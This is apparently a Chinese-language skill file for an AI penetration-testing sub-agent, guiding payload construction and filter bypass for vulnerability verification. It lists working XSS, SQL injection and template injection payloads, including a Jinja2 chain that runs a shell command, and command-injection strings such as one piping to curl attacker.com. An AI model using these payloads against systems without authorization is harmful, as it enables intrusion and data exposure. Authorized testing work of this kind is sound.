---
name: payload-research
description: 面向漏洞验证的 Payload 构造与绕过研究
tags: [pentest, payload, research]
---

# Payload 研究技能

## 适用场景
当你需要为漏洞验证研究、构造或改进 payload 时，使用本技能。

## 重点方向
- 输入点分析：用户输入从何处进入应用？
- 过滤器/WAF 识别：哪些内容会被拦截或清洗？
- 编码研究：URL 编码、HTML 实体、Unicode、双重编码
- 绕过技巧：替代语法、大小写变化、空字节
- 信号识别：哪些可观察行为能够确认漏洞存在？

## Payload 类别

### XSS Payload
- 基础：`<script>alert(1)</script>`
- 事件处理器：`<img onerror=alert(1) src=x>`
- SVG：`<svg onload=alert(1)>`
- 模板注入：`{{constructor.constructor('alert(1)')()}}`

### SQLi Payload
- 检测：`' OR '1'='1`、`1; SELECT 1--`
- 联合查询：`' UNION SELECT null,null--`
- 基于时间：`'; WAITFOR DELAY '0:0:5'--`

### SSTI Payload
- 检测：`{{7*7}}`、`${7*7}`、`<%= 7*7 %>`
- Jinja2：`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

### 命令注入
- 基础：`; id`、`| id`、`` `id` ``
- 盲注：`; sleep 5`、`| curl attacker.com`

## 输出规范
- 通过 `submit_sub_agent_output` 仅提交一次规范的机器可读输出。
- 保持 `candidate_findings.status` 为 `candidate`（此处不做最终漏洞判定）。
- 如果提供了 `hypothesis_id`，所有提交的假设/发现都必须保持在该单一假设之下。
- 如果编排器状态已标记 `goal_achieved=true`，默认动作是停止并移交文档/报告，除非明确要求深入分析。
- 提供可直接使用的 payload，并附上前提条件以及预期的成功/失败信号。
- 允许可选的 Markdown 说明，但机器摄入只读取提交的 JSON payload。
